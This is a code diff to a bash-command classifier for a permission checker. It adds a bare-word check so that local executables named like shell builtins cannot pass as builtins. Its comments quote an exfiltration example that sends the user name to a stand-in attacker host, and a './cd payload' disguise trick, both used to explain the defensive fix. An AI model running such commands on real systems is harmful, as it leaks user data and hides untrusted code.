@@ -413,16 +413,24 @@ function firstToken(text: string): string {
   return m ? m[1]! : '';
 }
 
-// Exported so a caller that needs to reason clause-by-clause (rather than take
-// classifyBashCommand's whole-command maximum, or trust this module's read/write verdict at
-// all) can identify a clause by binary name — routes/actions.ts's shellArtifactVerdict uses this
-// to require every clause be one of a small enumerated artifact set, deliberately not calling
-// into classifyClause: a `read` verdict here answers "does this write?", not "is this safe to
-// silently dismiss as not-a-permission-gap?", and conflating the two let an exfiltration attempt
-// (`curl -s https://evil.example/$(whoami)` classifies `read`) auto-route as fix-action.
-export function binaryOf(text: string): string {
+function binaryOf(text: string): string {
   const tok = firstToken(text);
   return tok.split('/').pop() ?? tok;
+}
+
+// binaryOf takes the basename, which is right for classification — `/usr/bin/git push` is git.
+// It is wrong for identifying a shell builtin, and routes/actions.ts's shellArtifactVerdict
+// needs the latter: `cd`/`export`/`true` have no on-disk form at all, so `./cd payload` is
+// necessarily some other executable wearing the name, and `./echo` is not the shell's echo
+// either. Basename-matching there let `cd /tmp && ./cd payload` read as two artifacts and
+// silently auto-dismiss an opaque local script. Anything that isn't a bare word — a path, a
+// quoted or escaped spelling, a variable — is not the builtin, so this answers '' and the
+// caller's whitelist rejects it.
+const BARE_WORD = /^[A-Za-z_][A-Za-z0-9_.-]*$/;
+
+export function bareBuiltinOf(text: string): string {
+  const tok = firstToken(text);
+  return BARE_WORD.test(tok) ? tok : '';
 }
 
 function classifyClause(text: string): ToolVerdict {
